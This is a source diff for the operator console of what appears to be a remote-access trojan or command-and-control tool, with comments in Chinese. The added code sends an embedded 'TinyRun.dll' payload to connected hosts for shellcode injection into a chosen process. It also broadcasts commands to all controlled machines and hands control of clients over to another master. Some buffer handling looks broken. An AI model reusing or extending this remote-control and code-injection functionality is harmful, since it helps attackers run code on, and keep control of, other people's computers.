@@ -281,6 +281,25 @@ DllInfo* ReadPluginDll(const std::string& filename)
     return new DllInfo{ name, buf };
 }
 
+DllInfo* ReadTinyRunDll(int pid) {
+    std::string name = "TinyRun.dll";
+    DWORD fileSize = 0;
+    BYTE * dllData = ReadResource(IDR_TINYRUN_X64, fileSize);
+	// 设置输出参数
+	auto md5 = CalcMD5FromBytes(dllData, fileSize);
+    DllExecuteInfo info = { SHELLCODE, fileSize, CALLTYPE_DEFAULT, {}, {}, pid };
+	memcpy(info.Name, name.c_str(), name.length());
+	memcpy(info.Md5, md5.c_str(), md5.length());
+    BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
+	buffer[0] = CMD_EXECUTE_DLL;
+	memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
+    memcpy(buffer + 1 + sizeof(DllExecuteInfo), dllData, fileSize);
+	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
+    SAFE_DELETE_ARRAY(dllData);
+	SAFE_DELETE_ARRAY(buffer);
+	return new DllInfo{ name, buf };
+}
+
 std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath)
 {
     std::vector<DllInfo*> result;
@@ -457,6 +476,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_MESSAGE(WM_PASSWORDCHECK, OnPasswordCheck)
     ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
     ON_MESSAGE(WM_SHOWERRORMSG, OnShowErrMessage)
+    ON_MESSAGE(WM_INJECT_SHELLCODE, InjectShellcode)
+    ON_MESSAGE(WM_SHARE_CLIENT, ShareClient)
+    ON_MESSAGE(WM_ASSIGN_CLIENT, AssignClient)
+    ON_MESSAGE(WM_ASSIGN_ALLCLIENT, AssignAllClient)
     ON_WM_HELPINFO()
     ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
     ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
@@ -697,6 +720,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
             SetClientMapData(id, MAP_LOCATION, loc);
         }
     }
+    bool flag = strIP == "127.0.0.1" && !v[RES_CLIENT_PUBIP].empty();
+    data[ONLINELIST_IP] = flag ? v[RES_CLIENT_PUBIP].c_str() : strIP;
     data[ONLINELIST_LOCATION] = loc;
     ContextObject->SetClientInfo(data, v);
     ContextObject->SetID(id);
@@ -721,10 +746,9 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     if (modify)
         SaveToFile(m_ClientMap, GetDbPath());
     auto& m = m_ClientMap[ContextObject->ID];
-    bool flag = strIP == "127.0.0.1" && !v[RES_CLIENT_PUBIP].empty();
     m_HostList.insert(ContextObject);
     if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
-        int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), flag ? v[RES_CLIENT_PUBIP].c_str() : strIP);
+        int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), data[ONLINELIST_IP]);
         for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
             n == ONLINELIST_COMPUTER_NAME ?
             m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data[n]) :
@@ -1792,6 +1816,25 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
     LeaveCriticalSection(&m_cs);
 }
 
+VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
+{
+	EnterCriticalSection(&m_cs);
+	for (int i=0; i<m_CList_Online.GetItemCount(); ++i){
+		context* ContextObject = (context*)m_CList_Online.GetItemData(i);
+		if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
+			continue;
+		if (szBuffer[0] == COMMAND_UPDATE) {
+			CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
+			if (data == "SC" || data == "MDLL") {
+				ContextObject->Send2Client(szBuffer, 1);
+				continue;
+			}
+		}
+		ContextObject->Send2Client(szBuffer, ulLength);
+	}
+	LeaveCriticalSection(&m_cs);
+}
+
 //真彩Bar
 VOID CMy2015RemoteDlg::OnAbout()
 {
@@ -2181,11 +2224,18 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
         DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
+        if (std::string(info->Name) == "TinyRun.dll") {
+			auto tinyRun = ReadTinyRunDll(info->Pid);
+			Buffer* buf = tinyRun->Data;
+            ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
+            SAFE_DELETE(tinyRun);
+            break;
+		}
         for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
             DllInfo* dll = *i;
             if (dll->Name == info->Name) {
                 // TODO 如果是UDP，发送大包数据基本上不可能成功
-                ContextObject->Send2Client( dll->Data->Buf(), dll->Data->length());
+                ContextObject->Send2Client(dll->Data->Buf(), dll->Data->length());
                 break;
             }
         }
@@ -2597,14 +2647,23 @@ void CMy2015RemoteDlg::OnOnlineShare()
         MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
         return;
     }
-
-    BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
-    // 目标主机类型
-    bToken[1] = SHARE_TYPE_YAMA;
-    memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
-    SendSelectedCommand(bToken, sizeof(bToken));
+    char* buf = new char[dlg.m_str.GetLength()+1];
+    memcpy(buf, dlg.m_str, dlg.m_str.GetLength());
+    buf[dlg.m_str.GetLength()] = 0;
+    PostMessageA(WM_SHARE_CLIENT, (WPARAM)buf, NULL);
 }
 
+LRESULT CMy2015RemoteDlg::ShareClient(WPARAM wParam, LPARAM lParam) {
+    char* buf = (char*)wParam;
+    int len = strlen(buf);
+	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
+	// 目标主机类型
+	bToken[1] = SHARE_TYPE_YAMA;
+	memcpy(bToken + 2, buf, len);
+	lParam ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
+    SAFE_DELETE_AR(buf);
+    return S_OK;
+}
 
 void CMy2015RemoteDlg::OnToolAuth()
 {
@@ -3333,16 +3392,37 @@ void CMy2015RemoteDlg::OnOnlineAssignTo()
         MessageBox("超出使用时间可输入的字符数限制!", "提示", MB_ICONINFORMATION);
         return;
     }
-
-    BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
-    // 目标主机类型
-    bToken[1] = SHARE_TYPE_YAMA_FOREVER;
-    memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
-    bToken[2 + dlg.m_str.GetLength()] = ':';
-    memcpy(bToken + 2 + dlg.m_str.GetLength() + 1, dlg.m_sSecondInput, dlg.m_sSecondInput.GetLength());
-    SendSelectedCommand(bToken, sizeof(bToken));
+    char* buf1 = new char[dlg.m_str.GetLength() + 1];
+    char *buf2 = new char[dlg.m_sSecondInput.GetLength() + 1];
+    memcpy(buf1, dlg.m_str, dlg.m_str.GetLength());
+    memcpy(buf2, dlg.m_sSecondInput, dlg.m_sSecondInput.GetLength());
+    buf1[dlg.m_str.GetLength()] = 0;
+    buf2[dlg.m_sSecondInput.GetLength()] = 0;
+    PostMessageA(WM_ASSIGN_CLIENT, (WPARAM)buf1, (LPARAM)buf2);
 }
 
+LRESULT CMy2015RemoteDlg::assignFunction(WPARAM wParam, LPARAM lParam, BOOL all) {
+	char* buf1 = (char*)wParam, * buf2 = (char*)lParam;
+	int len1 = strlen(buf1), len2 = strlen(buf2);
+	BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
+	// 目标主机类型
+	bToken[1] = SHARE_TYPE_YAMA_FOREVER;
+	memcpy(bToken + 2, buf1, len1);
+	bToken[2 + len1] = ':';
+	memcpy(bToken + 2 + len1 + 1, buf2, len2);
+	all ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
+	SAFE_DELETE_AR(buf1);
+	SAFE_DELETE_AR(buf2);
+	return S_OK;
+}
+
+LRESULT CMy2015RemoteDlg::AssignClient(WPARAM wParam, LPARAM lParam) {
+    return assignFunction(wParam, lParam, FALSE);
+}
+
+LRESULT CMy2015RemoteDlg::AssignAllClient(WPARAM wParam, LPARAM lParam) {
+    return assignFunction(wParam, lParam, TRUE);
+}
 
 void CMy2015RemoteDlg::OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult)
 {
@@ -3754,4 +3834,36 @@ void CMy2015RemoteDlg::OnToolReloadPlugins()
 	GetModuleFileNameA(NULL, path, _MAX_PATH);
 	GET_FILEPATH(path, "Plugins");
 	m_DllList = ReadAllDllFilesWindows(path);
+}
+
+context* CMy2015RemoteDlg::FindHostByIP(const std::string& ip) {
+    CString clientIP(ip.c_str());
+	EnterCriticalSection(&m_cs);
+	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+		context* ContextObject = *i;
+        if (ContextObject->GetClientData(ONLINELIST_IP) == clientIP) {
+            LeaveCriticalSection(&m_cs);
+			return ContextObject;
+        }
+    }
+	LeaveCriticalSection(&m_cs);
+    return NULL;
+}
+
+LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam){
+    std::string* ip = (std::string*)wParam;
+    int pid = lParam;
+    InjectTinyRunDll(*ip, pid);
+    delete ip;
+    return S_OK;
+}
+
+void CMy2015RemoteDlg::InjectTinyRunDll(const std::string& ip, int pid){
+	auto ctx = FindHostByIP(ip);
+	if (ctx == NULL)return;
+
+    auto tinyRun = ReadTinyRunDll(pid);
+	Buffer* buf = tinyRun->Data;
+	ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
+    SAFE_DELETE(tinyRun);
 }
